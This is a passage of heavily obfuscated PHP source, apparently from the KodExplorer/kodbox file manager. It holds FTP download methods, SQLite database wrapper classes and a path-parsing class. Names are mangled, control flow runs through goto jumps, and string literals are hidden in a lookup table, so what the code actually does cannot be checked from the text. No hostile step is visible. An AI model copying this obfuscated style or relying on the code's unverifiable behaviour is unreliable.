FTP_MOREDATA) { $E‚ÔÉ¾äæÔ = ftp_nb_continue($this->connect); } goto cø××‚ë–; FÄö‘óê‘÷: } public function download($d‰Ğøé‘‘, $fíöÁ¨ë = '') { goto dÛ«Å‡¨ˆñ; Aƒø—£Ü¤Ç: while ($AÓä ‰Ä›Ã == FTP_MOREDATA) { $AÓä ‰Ä›Ã = ftp_nb_continue($this->connect); } if ($AÓä ‰Ä›Ã != FTP_FINISHED) { return !1; } return $this->iconvApp($fíöÁ¨ë); goto c¡°¬à´¬Ù; C–ÌŠ¥Ø¢£: $d‰Ğøé‘‘ = $this->iconvSystem($d‰Ğøé‘‘); $fíöÁ¨ë = $this->iconvSystem($fíöÁ¨ë); $AÓä ‰Ä›Ã = ftp_nb_get($this->connect, $fíöÁ¨ë, $d‰Ğøé‘‘, FTP_BINARY); goto Aƒø—£Ü¤Ç; dÛ«Å‡¨ˆñ: if (!$this->_isconn()) { return !1; } $CŞš¶œŠâ© = $this->pathFather($fíöÁ¨ë); if (!IO::mkdir($CŞš¶œŠâ©)) { return !1; } goto C–ÌŠ¥Ø¢£; c¡°¬à´¬Ù: } public function exist($c«´ÂñÚò) { return $this->isFile($c«´ÂñÚò) || $this->isFolder($c«´ÂñÚò); } public function isFile($E³ğ™Òø›†) { return !$this->isFolder($E³ğ™Òø›†) && $this->objectMeta($E³ğ™Òø›†); } public function isFolder($AØ×Şò©‹‡) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][197], $AØ×Şò©‹‡); } protected function objectMeta($C÷„è÷Úá) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][198], $C÷„è÷Úá); } protected function _objectMeta($DÍã“ËŒó) { goto dã…‚¦º¼; aË“”Ë‹ğŠ: $Eööô·¶é = @ftp_size($this->connect, $DÍã“ËŒó); if ($Eööô·¶é != -1) { $a¾¥¶‰±»Á[$e®ÕÑå“áß[77]] = $Eööô·¶é; } else { $eÂ¯Ş’Ö†Å = @ftp_chdir($this->connect, $DÍã“ËŒó); if (!$eÂ¯Ş’Ö†Å) { return !1; } $a¾¥¶‰±»Á[$e®ÕÑå“áß[29]] = $e®ÕÑå“áß[76]; } return $a¾¥¶‰±»Á; goto f£§©…Ñë; aÖí„­¹ò‚: $DÍã“ËŒó = $this->iconvSystem($DÍã“ËŒó); $a¾¥¶‰±»Á = array($e®ÕÑå“áß[28] => $this->iconvApp($DÍã“ËŒó), $e®ÕÑå“áß[29] => $e®ÕÑå“áß[173], $e®ÕÑå“áß[77] => 0); @ftp_chdir($this->connect, $e®ÕÑå“áß[8]); goto aË“”Ë‹ğŠ; dã…‚¦º¼: $e®ÕÑå“áß =& $_SERVER[Æ¼ôºÙï]; if ($DÍã“ËŒó == $e®ÕÑå“áß[33] || $DÍã“ËŒó == $e®ÕÑå“áß[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto aÖí„­¹ò‚; f£§©…Ñë: } protected function _isFolder($aº¦äÏİÁº) { $b¥Æ¹Æ·×ö =& $_SERVER[Æ¼ôºÙï]; if ($aº¦äÏİÁº == $b¥Æ¹Æ·×ö[33] || $aº¦äÏİÁº == $b¥Æ¹Æ·×ö[8]) { return !0; } $c„•ªè‹‡ = $this->_objectMeta($aº¦äÏİÁº); return isset($c„•ªè‹‡[$b¥Æ¹Æ·×ö[29]]) && $c„•ªè‹‡[$b¥Æ¹Æ·×ö[29]] == $b¥Æ¹Æ·×ö[76] ? !0 : !1; } } goto FÓ˜ÂË»øë; Cºá‡ì÷ôÉ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto EÈ«çá°àš; A£·ëã–õÍ: $this->tpl = TEMPLATE . MOD . $BôÊ²‰¿ì[8]; $this->_classObjectID = mt_rand(0, 10000); goto EÇ¢½˜ç¾í; BËïáôœç: $this->in =& $in; $this->values[$BôÊ²‰¿ì[6]] =& $config; $this->values[$BôÊ²‰¿ì[7]] =& $in; goto A£·ëã–õÍ; EÈ«çá°àš: $BôÊ²‰¿ì =& $_SERVER[Æ¼ôºÙï]; global $in, $config; $this->config =& $config; goto BËïáôœç; EÇ¢½˜ç¾í: } public function loadClass($bĞÆóì»ƒ) { if (1 === func_num_args()) { $this->{$bĞÆóì»ƒ} = new $bĞÆóì»ƒ(); } else { $c¡©²õÍô… = new ReflectionClass($bĞÆóì»ƒ); $dİÚöåÓ¡ = func_get_args(); array_shift($dİÚöåÓ¡); $this->{$bĞÆóì»ƒ} = $c¡©²õÍô…->newInstanceArgs($dİÚöåÓ¡); } return $this->{$bĞÆóì»ƒ}; } protected function assign($f×‚äöŒà, $BˆÄğ¤Ô’) { $this->values[$f×‚äöŒà] = $BˆÄğ¤Ô’; } protected function display($D£ášĞ»¬Ö) { ob_end_clean(); extract($this->values); require $this->tpl . $D£ášĞ»¬Ö; } } class DbSqliteBase extends Db { public function __construct($D‰Ûù¸À® = '') { $eôç´Ã¶Œé =& $_SERVER[Æ¼ôºÙï]; if (!extension_loaded($eôç´Ã¶Œé[9])) { think_exception(think_lang($eôç´Ã¶Œé[10]) . $eôç´Ã¶Œé[11]); } if (!empty($D‰Ûù¸À®)) { if (!isset($D‰Ûù¸À®[$eôç´Ã¶Œé[12]])) { $D‰Ûù¸À®[$eôç´Ã¶Œé[12]] = 438; } $this->config = $D‰Ûù¸À®; if (empty($this->config[$eôç´Ã¶Œé[13]])) { $this->config[$eôç´Ã¶Œé[13]] = array(); } } } public function connect($aÄ„ß—…© = '', $Eç¯…‰ëÌ = 0) { $c‹Åà§š =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->linkID[$Eç¯…‰ëÌ])) { goto Aß²ŸõÂô; cØ¡ëºÍ«±: @sqlite_busy_timeout($this->linkID[$Eç¯…‰ëÌ], 30000); if (1 != think_config($c‹Åà§š[18])) { unset($this->config); } goto dÖøõ­¶¢ƒ; B½¶”»¦ĞÒ: $this->linkID[$Eç¯…‰ëÌ] = $EñŸíøôÕ($aÄ„ß—…©[$c‹Åà§š[17]], $aÄ„ß—…©[$c‹Åà§š[12]]); if (!$this->linkID[$Eç¯…‰ëÌ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cØ¡ëºÍ«±; Aß²ŸõÂô: if (empty($aÄ„ß—…©)) { $aÄ„ß—…© = $this->config; } $BëùÙÅ•‚• = !empty($aÄ„ß—…©[$c‹Åà§š[13]][$c‹Åà§š[14]]) ? $aÄ„ß—…©[$c‹Åà§š[13]][$c‹Åà§š[14]] : $this->pconnect; $EñŸíøôÕ = $BëùÙÅ•‚• ? $c‹Åà§š[15] : $c‹Åà§š[16]; goto B½¶”»¦ĞÒ; dÖøõ­¶¢ƒ: } return $this->linkID[$Eç¯…‰ëÌ]; } public function free() { $this->queryID = null; } public function query($Fô†œœ•˜) { goto C‘”Æ’É; C‘”Æ’É: $fç ÈÂŒ¨ä =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÈ–Œì Í; dÈ–Œì Í: $this->queryStr = $Fô†œœ•˜; if ($this->queryID) { $this->free(); } think_action_status($fç ÈÂŒ¨ä[19], 1); goto cØÒö›”¤‘; cØÒö›”¤‘: think_status($fç ÈÂŒ¨ä[20]); $this->queryID = sqlite_query($this->_linkID, $Fô†œœ•˜); $this->debug(); goto C™îÓ†³±; C™îÓ†³±: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $D©³ÙÓÑêØ = $this->getAll(); return $D©³ÙÓÑêØ; } goto b¿À¹ÁİÄ; b¿À¹ÁİÄ: } public function execute($Dî«’ƒŒÎ) { goto A½ŒŒí¸¡; Dñ¨í”Ï¨ª: think_status($d²ïÏ¤åÃˆ[20]); $dŠƒïÏğ¥Œ = sqlite_exec($this->_linkID, $Dî«’ƒŒÎ); $this->debug(); goto d¥–ÁÚâù; A½ŒŒí¸¡: $d²ïÏ¤åÃˆ =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D¡«‡Ê‚˜”; D¡«‡Ê‚˜”: $this->queryStr = $Dî«’ƒŒÎ; if ($this->queryID) { $this->free(); } think_action_status($d²ïÏ¤åÃˆ[21], 1); goto Dñ¨í”Ï¨ª; d¥–ÁÚâù: if (!1 === $dŠƒïÏğ¥Œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto bÔ Û¢§‚; bÔ Û¢§‚: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Æ¼ôºÙï][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b°Ëµ›Ù†¿ = sqlite_query($this->_linkID, $_SERVER[Æ¼ôºÙï][23]); if (!$b°Ëµ›Ù†¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C‚È®®É“° = sqlite_query($this->_linkID, $_SERVER[Æ¼ôºÙï][24]); if (!$C‚È®®É“°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Déñ¬ĞßÇÍ = array(); if ($this->numRows > 0) { for ($A›çìå–ù = 0; $A›çìå–ù < $this->numRows; $A›çìå–ù++) { $Déñ¬ĞßÇÍ[$A›çìå–ù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Déñ¬ĞßÇÍ; } public function getFields($E«°–¡ÓÔ’) { $fÆßË¦¸ŠÛ =& $_SERVER[Æ¼ôºÙï]; $C¦‰ª¥Ã¾È = $this->query($fÆßË¦¸ŠÛ[25] . $E«°–¡ÓÔ’ . $fÆßË¦¸ŠÛ[26]); $Dƒß«ÅõÌ = array(); if ($C¦‰ª¥Ã¾È) { foreach ($C¦‰ª¥Ã¾È as $C¼ÔÙé§°¥ => $FÓĞ¦¶îİ™) { $Dƒß«ÅõÌ[$FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[27]]] = array($fÆßË¦¸ŠÛ[28] => $FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[27]], $fÆßË¦¸ŠÛ[29] => $FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[30]], $fÆßË¦¸ŠÛ[31] => (bool) ($FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[32]] === $fÆßË¦¸ŠÛ[33]), $fÆßË¦¸ŠÛ[34] => $FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[35]], $fÆßË¦¸ŠÛ[36] => strtolower($FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[37]]) == $fÆßË¦¸ŠÛ[38], $fÆßË¦¸ŠÛ[39] => strtolower($FÓĞ¦¶îİ™[$fÆßË¦¸ŠÛ[40]]) == $fÆßË¦¸ŠÛ[41]); } } return $Dƒß«ÅõÌ; } public function getTables($EÚ´ãåùÔÃ = '') { $aµÏ»Ù™¦Ï =& $_SERVER[Æ¼ôºÙï]; $DĞêàŞå«å = $this->query($aµÏ»Ù™¦Ï[42] . $aµÏ»Ù™¦Ï[43] . $aµÏ»Ù™¦Ï[44]); $bÉõ´® ¤¿ = array(); foreach ($DĞêàŞå«å as $fè—­ğ ğÂ => $a£ÆšÎ˜‚Ö) { $bÉõ´® ¤¿[$fè—­ğ ğÂ] = current($a£ÆšÎ˜‚Ö); } return $bÉõ´® ¤¿; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $få’ß°ÎÛ» =& $_SERVER[Æ¼ôºÙï]; $E±òèÑ¶ = sqlite_last_error($this->_linkID); $this->error = $E±òèÑ¶ . $få’ß°ÎÛ»[4] . sqlite_error_string($E±òèÑ¶); if ($få’ß°ÎÛ»[33] != $this->queryStr) { $this->error .= LNG($få’ß°ÎÛ»[45]) . $this->queryStr; } think_trace($this->error, $få’ß°ÎÛ»[33], $få’ß°ÎÛ»[46]); return $this->error; } public function escapeString($AÊù©¬Á£Ô) { return sqlite_escape_string($AÊù©¬Á£Ô); } public function parseLimit($F¦«ÏÄíİ) { $c˜†ƒ¢ÏÄÕ =& $_SERVER[Æ¼ôºÙï]; $fù‚ïÚß— = $c˜†ƒ¢ÏÄÕ[33]; if (!empty($F¦«ÏÄíİ)) { $F¦«ÏÄíİ = explode($c˜†ƒ¢ÏÄÕ[47], $F¦«ÏÄíİ); if (count($F¦«ÏÄíİ) > 1) { $fù‚ïÚß— .= $c˜†ƒ¢ÏÄÕ[48] . $F¦«ÏÄíİ[1] . $c˜†ƒ¢ÏÄÕ[49] . $F¦«ÏÄíİ[0] . $c˜†ƒ¢ÏÄÕ[50]; } else { $fù‚ïÚß— .= $c˜†ƒ¢ÏÄÕ[48] . $F¦«ÏÄíİ[0] . $c˜†ƒ¢ÏÄÕ[50]; } } return $fù‚ïÚß—; } } class DbSqlite3Base extends Db { public function __construct($D‚„õ ¾¡ = '') { $Cƒø¼¾Êª‹ =& $_SERVER[Æ¼ôºÙï]; if (!class_exists($Cƒø¼¾Êª‹[51])) { think_exception(think_lang($Cƒø¼¾Êª‹[10]) . $Cƒø¼¾Êª‹[52]); } if (!empty($D‚„õ ¾¡)) { if (!isset($D‚„õ ¾¡[$Cƒø¼¾Êª‹[12]])) { $D‚„õ ¾¡[$Cƒø¼¾Êª‹[12]] = 438; } $this->config = $D‚„õ ¾¡; if (empty($this->config[$Cƒø¼¾Êª‹[13]])) { $this->config[$Cƒø¼¾Êª‹[13]] = array(); } } } public function connect($Cİ§Ÿ§¢«• = '', $cŠˆíòë¯‹ = 0) { $CÅîœñ†²¸ =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->linkID[$cŠˆíòë¯‹])) { if (empty($Cİ§Ÿ§¢«•)) { $Cİ§Ÿ§¢«• = $this->config; } $this->linkID[$cŠˆíòë¯‹] = new SQLite3($Cİ§Ÿ§¢«•[$CÅîœñ†²¸[17]]); if (!$this->linkID[$cŠˆíòë¯‹]) { think_exception($this->linkID[$cŠˆíòë¯‹]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$cŠˆíòë¯‹]->busyTimeout(30000); if (1 != think_config($CÅîœñ†²¸[18])) { unset($this->config); } } return $this->linkID[$cŠˆíòë¯‹]; } public function free() { $this->queryID = null; } public function query($D˜Ç¬„) { goto ağˆãÉÍ›æ; Bµ×Ø½†ÆĞ: $this->queryStr = $D˜Ç¬„; if ($this->queryID) { $this->free(); } think_action_status($Cô’Ûİ¯—¾[19], 1); goto d©¢¬©Š¹‹; d©¢¬©Š¹‹: think_status($Cô’Ûİ¯—¾[20]); $this->queryID = $this->_linkID->query($D˜Ç¬„); $this->debug(); goto bğ±Æššİ; ağˆãÉÍ›æ: $Cô’Ûİ¯—¾ =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Bµ×Ø½†ÆĞ; bğ±Æššİ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f«ßÙÑç¬ = $this->getAll(); $this->numRows = count($f«ßÙÑç¬); return $f«ßÙÑç¬; } goto a¸Ô­²•®; a¸Ô­²•®: } public function execute($F¶íô¢¦ø) { goto fÖªêó¯é°; CÁŠÀˆÁ¸: if (!1 === $c…ƒ„¿Íˆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto F¬Ò—¤…í; fÖªêó¯é°: $e¡Ğó˜¨ã˜ =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aœ¹ é¬“; fËĞº›¨Æô: think_status($e¡Ğó˜¨ã˜[20]); $c…ƒ„¿Íˆ = $this->_linkID->exec($F¶íô¢¦ø); $this->debug(); goto CÁŠÀˆÁ¸; aœ¹ é¬“: $this->queryStr = $F¶íô¢¦ø; if ($this->queryID) { $this->free(); } think_action_status($e¡Ğó˜¨ã˜[21], 1); goto fËĞº›¨Æô; F¬Ò—¤…í: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Æ¼ôºÙï][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B¨­°ŒÚçñ = $this->_linkID->query($_SERVER[Æ¼ôºÙï][23]); if (!$B¨­°ŒÚçñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $F÷Ç¢ÓŞ‚ = $this->_linkID->query($_SERVER[Æ¼ôºÙï][24]); if (!$F÷Ç¢ÓŞ‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aËáòÅÕš = array(); while ($e¦Øªæ¥œ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $aËáòÅÕš[] = $e¦Øªæ¥œ; } $this->queryID->reset(); return $aËáòÅÕš; } public function getFields($c¾‚ôÃæ¾Ø) { $aÑó†Ú°ö =& $_SERVER[Æ¼ôºÙï]; $d„—ÃËƒÙ = $this->query($aÑó†Ú°ö[25] . $c¾‚ôÃæ¾Ø . $aÑó†Ú°ö[26]); $dª› Ü×Œ = array(); if ($d„—ÃËƒÙ) { foreach ($d„—ÃËƒÙ as $aŒ˜Ã¦÷“½ => $BŠ£ò‘ã«) { $dª› Ü×Œ[$BŠ£ò‘ã«[$aÑó†Ú°ö[28]]] = array($aÑó†Ú°ö[28] => $BŠ£ò‘ã«[$aÑó†Ú°ö[28]], $aÑó†Ú°ö[29] => $BŠ£ò‘ã«[$aÑó†Ú°ö[29]], $aÑó†Ú°ö[31] => (bool) ($BŠ£ò‘ã«[$aÑó†Ú°ö[31]] === $aÑó†Ú°ö[33]), $aÑó†Ú°ö[34] => $BŠ£ò‘ã«[$aÑó†Ú°ö[53]], $aÑó†Ú°ö[36] => (bool) $BŠ£ò‘ã«[$aÑó†Ú°ö[54]], $aÑó†Ú°ö[39] => (bool) $BŠ£ò‘ã«[$aÑó†Ú°ö[54]]); } } return $dª› Ü×Œ; } public function getTables($C°ÑßÖº = '') { $FÒÅ…ÉéÛÒ =& $_SERVER[Æ¼ôºÙï]; $b©ÚÔ¹‘…¡ = $this->query($FÒÅ…ÉéÛÒ[42] . $FÒÅ…ÉéÛÒ[43] . $FÒÅ…ÉéÛÒ[44]); $F„©ÄÓÅÈŠ = array(); foreach ($b©ÚÔ¹‘…¡ as $c¿ÔŠšò => $F‡‹ÂÁ°µ ) { $F„©ÄÓÅÈŠ[$c¿ÔŠšò] = current($F‡‹ÂÁ°µ ); } return $F„©ÄÓÅÈŠ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e×²Úö‚³Ú =& $_SERVER[Æ¼ôºÙï]; $this->error = $this->_linkID->lastErrorMsg(); if ($e×²Úö‚³Ú[33] != $this->queryStr) { $this->error .= LNG($e×²Úö‚³Ú[45]) . $this->queryStr; } think_trace($this->error, $e×²Úö‚³Ú[33], $e×²Úö‚³Ú[46]); return $this->error; } public function escapeString($aÓâ¢÷Ñ³Í) { $Dñˆ„…¶Ìò =& $_SERVER[Æ¼ôºÙï]; if ($this->_linkID) { return $this->_linkID->escapeString($aÓâ¢÷Ñ³Í); } return str_ireplace($Dñˆ„…¶Ìò[55], $Dñˆ„…¶Ìò[56], $aÓâ¢÷Ñ³Í); } public function parseLimit($eô»ù ™¢™) { $B–¾š®×˜¸ =& $_SERVER[Æ¼ôºÙï]; $a¤ªÃëÁÓ = $B–¾š®×˜¸[33]; if (!empty($eô»ù ™¢™)) { $eô»ù ™¢™ = explode($B–¾š®×˜¸[47], $eô»ù ™¢™); if (count($eô»ù ™¢™) > 1) { $a¤ªÃëÁÓ .= $B–¾š®×˜¸[48] . $eô»ù ™¢™[1] . $B–¾š®×˜¸[49] . $eô»ù ™¢™[0] . $B–¾š®×˜¸[50]; } else { $a¤ªÃëÁÓ .= $B–¾š®×˜¸[48] . $eô»ù ™¢™[0] . $B–¾š®×˜¸[50]; } } return $a¤ªÃëÁÓ; } } goto D—ÒâÚÏ™–; bÓÄÄ¼»: class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\143\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\x52\145\x63\171\143\x6c\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\x69\154\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\x46\x69\154\145\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\160\122\x6f\157\164\123\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\x53\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\x68\x61\162\145\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\x65\x49\x74\145\x6d\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\x65\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\x72\122\x65\x6e\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\151\166\145\x72\x7d"; public static function typeList() { $dùËğ¬¤–× =& $_SERVER[Æ¼ôºÙï]; return array($dùËğ¬¤–×[1117] => self::KOD_SOURCE, $dùËğ¬¤–×[1118] => self::KOD_USER_RECYCLE, $dùËğ¬¤–×[1119] => self::KOD_USER_FAV, $dùËğ¬¤–×[1120] => self::KOD_USER_FILE_TAG, $dùËğ¬¤–×[1121] => self::KOD_USER_FILE_TYPE, $dùËğ¬¤–×[1122] => self::KOD_GROUP_ROOT_SELF, $dùËğ¬¤–×[1123] => self::KOD_USER_SHARE, $dùËğ¬¤–×[1124] => self::KOD_USER_SHARE_LINK, $dùËğ¬¤–×[1125] => self::KOD_USER_SHARE_TO_ME, $dùËğ¬¤–×[1126] => self::KOD_SHARE_ITEM, $dùËğ¬¤–×[1127] => self::KOD_SHARE_LINK, $dùËğ¬¤–×[1128] => self::KOD_SEARCH, $dùËğ¬¤–×[1129] => self::KOD_BLOCK, $dùËğ¬¤–×[1130] => self::KOD_IO, $dùËğ¬¤–×[1131] => self::KOD_USER_RECENT, $dùËğ¬¤–×[1132] => self::KOD_USER_DRIVER); } public static function parse($FËÕªŞ½±Ë) { goto e‘âáÅ•; B„ÜùÜ·Ø: $bë ˜àì¨ = array($f‹ñÈÛ¯è[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[1098]] = in_array($Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[29]], $bë ˜àì¨); return $Fì´ÕÌ¹ø°; goto bÖªÀ Æ²ë; F”·†˜óîö: preg_match($f‹ñÈÛ¯è[1133], $FËÕªŞ½±Ë, $f¬šÍ‹Ç); $Fì´ÕÌ¹ø° = array($f‹ñÈÛ¯è[406] => !1, $f‹ñÈÛ¯è[1134] => !1, $f‹ñÈÛ¯è[403] => !1, $f‹ñÈÛ¯è[75] => $FËÕªŞ½±Ë, $f‹ñÈÛ¯è[1044] => !1, $f‹ñÈÛ¯è[1043] => $f‹ñÈÛ¯è[33]); if (is_array($f¬šÍ‹Ç) && count($f¬šÍ‹Ç) == 5) { $açí¯¡‹Â = $f‹ñÈÛ¯è[1135] . $f¬šÍ‹Ç[2] . $f‹ñÈÛ¯è[323]; if (in_array($açí¯¡‹Â, $E®Ä†à«†®)) { $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[1044]] = $f¬šÍ‹Ç[1]; $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[29]] = $açí¯¡‹Â; $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[1136]] = substr($açí¯¡‹Â, 1, -1); $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[385]] = $f¬šÍ‹Ç[3]; } $Fì´ÕÌ¹ø°[$f‹ñÈÛ¯è[1043]] = $f¬šÍ‹Ç[4]; } goto B„ÜùÜ·Ø; e‘âáÅ•: $f‹ñÈÛ¯è =& $_SERVER[Æ¼ôºÙï]; $FËÕªŞ½±Ë = self::clear($FËÕªŞ½±Ë); $E®Ä†à«†® = array_values(self::typeList()); goto F”·†˜óîö; bÖªÀ Æ²ë: } public static function clear($f©å¢Ğë¬ß) { goto dè×ƒ§¨Ë¾; e¶Ãæº˜…Á: $A•¯Á¢›Ã = $FÌ³²ËŒÍ„[1137]; if (substr($f©å¢Ğë¬ß, 0, 3) == $FÌ³²ËŒÍ„[1138]) { $f©å¢Ğë¬ß = substr($f©å¢Ğë¬ß, 3); } while (strstr($f©å¢Ğë¬ß, $A•¯Á¢›Ã)) { $f©å¢Ğë¬ß = str_replace($A•¯Á¢›Ã, $FÌ³²ËŒÍ„[8], $f©å¢Ğë¬ß); } goto a¼×õ¶“ç; a¼×õ¶“ç: $f©å¢Ğë¬ß = preg_replace($FÌ³²ËŒÍ„[1139], $FÌ³²ËŒÍ„[8], $f©å¢Ğë¬ß); if ($f©å¢Ğë¬ß == $FÌ³²ËŒÍ„[8]) { return $FÌ³²ËŒÍ„[8]; } $f©å¢Ğë¬ß = rtrim($f©å¢Ğë¬ß, $FÌ³²ËŒÍ„[8]); goto DªÚÓÚ¥; dè×ƒ§¨Ë¾: $FÌ³²ËŒÍ„ =& $_SERVER[Æ¼ôºÙï]; $f©å¢Ğë¬ß = str_replace(array($FÌ³²ËŒÍ„[1016], $FÌ³²ËŒÍ„[227]), $FÌ³²ËŒÍ„[50], $f©å¢Ğë¬ß); $f©å¢Ğë¬ß = str_replace($FÌ³²ËŒÍ„[96], $FÌ³²ËŒÍ„[8], $f©å¢Ğë¬ß); goto e¶Ãæº˜…Á; DªÚÓÚ¥: return $f©å¢Ğë¬ß; goto fºÚó¶Œäì; fºÚó¶Œäì: } public static function sourceID($dº¢²ŞçÄå) { $dŒĞ­…å‚á =& $_SERVER[Æ¼ôºÙï]; $CŸÜÈÒÕÉë = self::parse($dº¢²ŞçÄå); if ($CŸÜÈÒÕÉë[$dŒĞ­…å‚á[29]] !== self::KOD_SOURCE) { show_json(LNG($dŒĞ­…å‚á[1140]), !1); } return $CŸÜÈÒÕÉë[$dŒĞ­…å‚á[385]]; } public static function make($A´¢¢¼­‚†) { if (!$A´¢¢¼­‚†) { return !1; } return self::makePath(self::KOD_SOURCE, intval($A´¢¢¼­‚†)); } public static function makeShare($fñÀªŞ½Õ, $fÌ‡¨ßÊ…å) { return self::makePath(self::KOD_SHARE_ITEM, $fñÀªŞ½Õ, $fÌ‡¨ßÊ…å); } public static function makeFileTypePath($eœ¶ê†á‹) { return self::makePath(self::KOD_USER_FILE_TYPE, $eœ¶ê†á‹); } public static function makeFileTagPath($D¥Ã¿õõÑ) { return self::makePath(self::KOD_USER_FILE_TAG, $D¥Ã¿õõÑ); } public static function makePath($C“‰ø‡£é, $A¢ºËÙŠö‚ = '', $AÃ†¿ßãËù = '') { $B…æÅ¦ë =& $_SERVER[Æ¼ôºÙï]; $A˜¼ˆá±ÀÅ = substr($C“‰ø‡£é, 1, -1); $b¢ì¬‰çÇ = $B…æÅ¦ë[1141] . $A˜¼ˆá±ÀÅ . $B…æÅ¦ë[1142] . $A¢ºËÙŠö‚ . $B…æÅ¦ë[1143]; $b¢ì¬‰çÇ = $AÃ†¿ßãËù ? $b¢ì¬‰çÇ . $AÃ†¿ßãËù . $B…æÅ¦ë[8] : $b¢ì¬‰çÇ; return $b¢ì¬‰çÇ; } public static function hashPath($fšî…ù­ùÁ) { $eñå‘ªÈšß =& $_SERVER[Æ¼ôºÙï]; $cö Äš = is_array($fšî…ù­ùÁ) ? $fšî…ù­ùÁ : IO::info($fšî…ù­ùÁ); $aË–”ø´¤Ô = _get($cö Äš, $eñå‘ªÈšß[1144], $eñå‘ªÈšß[33]); if (!$aË–”ø´¤Ô) { $b†Şñäâ”Á = KodIO::parse($cö Äš[$eñå‘ªÈšß[75]]); if (!$b†Şñäâ”Á[$eñå‘ªÈšß[29]]) { $aË–”ø´¤Ô = IO::hashSimple($cö Äš[$eñå‘ªÈšß[75]]); } } if (!$aË–”ø´¤Ô) { $aË–”ø´¤Ô = md5($cö Äš[$eñå‘ªÈšß[75]] . $cö Äš[$eñå‘ªÈšß[77]] . $cö Äš[$eñå‘ªÈšß[83]]); } return $aË–”ø´¤Ô; } public static function initSystemPath() { goto BÓ»´Ï÷Äë; eŠ©ÔÌ¢ºœ: IOHistory::bindEvent(); goto dÚç×Ğ¹Ê²; E›³Ü›ƒ¾­: define($Dî†ò™˜Ü¥[1147], self::systemPath($Dî†ò™˜Ü¥[1148])); define($Dî†ò™˜Ü¥[1149], self::systemPath($Dî†ò™˜Ü¥[1150])); define($Dî†ò™˜Ü¥[1151], self::systemPath($Dî†ò™˜Ü¥[1152])); goto eŠ©ÔÌ¢ºœ; BÓ»´Ï÷Äë: $Dî†ò™˜Ü¥ =& $_SERVER[Æ¼ôºÙï]; if (defined($Dî†ò™˜Ü¥[1145])) { return; } define($Dî†ò™˜Ü¥[1145], self::systemPath($Dî†ò™˜Ü¥[1146])); goto E›³Ü›ƒ¾­; dÚç×Ğ¹Ê²: } public static function 